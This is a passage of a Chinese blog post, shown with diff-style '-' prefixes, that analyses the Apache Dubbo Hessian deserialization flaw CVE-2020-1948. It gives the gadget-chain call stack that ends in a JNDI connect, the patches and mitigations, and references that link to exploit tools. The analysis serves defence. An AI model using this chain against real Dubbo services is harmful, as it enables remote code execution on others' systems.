-<p>至此，注入攻击的流程到这里执行完成。可以参考左下侧的堆栈链路：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">158</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">198</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:<span class="number">180</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:<span class="number">339</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">612</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:<span class="number">139</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">79</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:<span class="number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:<span class="number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="社区讨论amp安全网站修复建议">社区讨论&amp;安全网站修复建议</span></h2><blockquote>
-<ul>
-<li><p>合并社区 <code>aquariuspj</code> 用户给出的对 <code>DecodeableRpcInvocation</code> 增加入参类型校验</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">修复分支 #6374</a></p>
-</li>
-<li><p>漏洞发现者 <code>rui0</code> 建议删除 <code>RpcInvocation</code> 类的 <code>toString</code> 方法中输出的 <code>arguments</code> 参数,防范后反序列化攻击。同时对 <code>Hessian</code> 进行黑白名单加固来防范 <code>Hessian</code> 反序列化攻击。<br><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1338">评论建议</a></p>
-</li>
-</ul>
-<p>还有<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/766283">阿里云官方的安全建议</a></p>
-<blockquote>
-<p>目前官方还未发布针对此漏洞绕过手法的补丁，在阿里云提供一个月的默认防御期限内，建议客户参考以下方法进行缓解，并关注官方补丁动态，及时进行更新：</p>
-</blockquote>
-<ul>
-<li>1、升级 2.7.7 版本，并根据<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de">https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de</a> 的方法进行参数校验</li>
-<li>禁止将 <code>Dubbo</code> 服务端端口开放给公网，或仅仅只对能够连接至 <code>Dubbo</code> 服务端的可信消费端IP开放</li>
-<li><code>Dubbo</code> 协议默认采用 <code>Hessian</code> 作为序列化反序列化方式，该反序列化方式存在反序列化漏洞。在不影响业务的情况下，建议更换协议以及反序列化方式。具体更换方法可参考：<a target="_blank" rel="noopener" href="http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html">http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</a></li>
-</ul>
-</blockquote>
-<h2><span id="思考分析amp修复思路">思考分析&amp;修复思路</span></h2><h3><span id="复现条件有限">复现条件有限</span></h3><blockquote>
-<p>需要引入 <code>rome</code> 类型的 <code>jar</code> 包，包含特殊的构造方法和 <code>toString</code> 方法（或许还有其它攻击点）</p>
-</blockquote>
-<h3><span id="社区讨论内容">社区讨论内容</span></h3><blockquote>
-<p>社区讨论和 <code>commit</code> 的内容，增加了前置校验，在反序列化之前判断服务或方法是否有效，非 <code>$invoke</code> 或 <code>$echo</code> 方法将会抛出错误，不进行参数的反序列化，增加了一点攻击难度。但由于方法名 <code>methodName</code> 可以用户自定义，所以修改方法名还是有可能跳过校验，触发漏洞</p>
-<p><img src="/2025/12/11/CVE-2020-1948-Apache-Dubbo/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="结合业务分析">结合业务分析</span></h3><blockquote>
-<p>业务方使用 <code>rome</code> 依赖的很少，构造这种类型的攻击，由于没有这个类，在 <code>provider</code> 反序列化时会提前报 <code>classNotFoundException</code>，没有执行到 <code>readObject</code> 方法，从而无法攻击。</p>
-<p><strong>综上所述，考虑到修复难度和影响范围，最后对 dubbo 修改方案如下：</strong></p>
-<ul>
-<li>1、合并社区针对改漏洞的<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">修复分支 #6374</a></li>
-<li>2、将 <code>RpcInvocation#toString</code> 方法中 <code>Arrays.toString(arguments)</code> 移除，避免对输入参数进行反序列化</li>
-</ul>
-</blockquote>
-<h2><span id="絮叨">絮叨</span></h2><blockquote>
-<p>隔行如隔山，一山还有一山高，修复漏洞真困难。感慨漏洞发现者们，多亏这些白帽子的仔细，揭露了这么多可攻击点，将漏洞信息提交到安全中心，让使用方了解到漏洞详情。</p>
-<p>还有 <code>Dubbo</code> 这个中间件的社区活跃度很高，出现问题后，大家讨论的热情高涨，积极去修复漏洞，社区活跃度高，代码更新快，支持的功能越来越多，使用起来也更放心。</p>
-<p>通过这次分析，了解到挺多基础的安全知识，感觉随着开源代码被研究更透彻，可供攻击的点也越来越多，在代码设计和编写时，也得注意一下安全信息，避免被攻击。</p>
-</blockquote>
-<h2><span id="参考资料">参考资料</span></h2><blockquote>
-<p>1、<a target="_blank" rel="noopener" href="https://xlab.tencent.com/cn/2020/06/23/xlab-20-001/">Apache Dubbo Provider 远程代码执行漏洞 (CVE-2020-1948)</a></p>
-<p>2、<a target="_blank" rel="noopener" href="https://www.sayers.top/cve_2020_1948.html">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
-<p>3、<a target="_blank" rel="noopener" href="https://paper.seebug.org/1266/">Apache Dubbo (CVE-2020-1948) 反序列化漏洞及其补丁绕过深度分析</a></p>
-<p>4、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wU1iacELbhspWMftRIQdeA">Apache Dubbo漏洞CVE-2020-1948分析</a></p>
-<p>5、<a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
-<p>6、<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">LADP、RMI 注入程序原理说明</a></p>
-<p>7、<a target="_blank" rel="noopener" href="https://github.com/sayers522/JNDI-Injection-Exploit">示范例子使用的注入程序</a></p>
-<p>8、<a target="_blank" rel="noopener" href="https://www.geekby.xyz/2020/07/01/apache-dubbo-provider-fan-xu-lie-hua-lou-dong-cve-2020-1948/">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)</a></p>
-<p>9、<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec 工具包</a></p>
-<p>10、<a target="_blank" rel="noopener" href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/">渗透中 PoC、Exp、Payload 与 Shellcode 的区别</a></p>
-<p>11、<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/issues/6364">Github 社区讨论</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
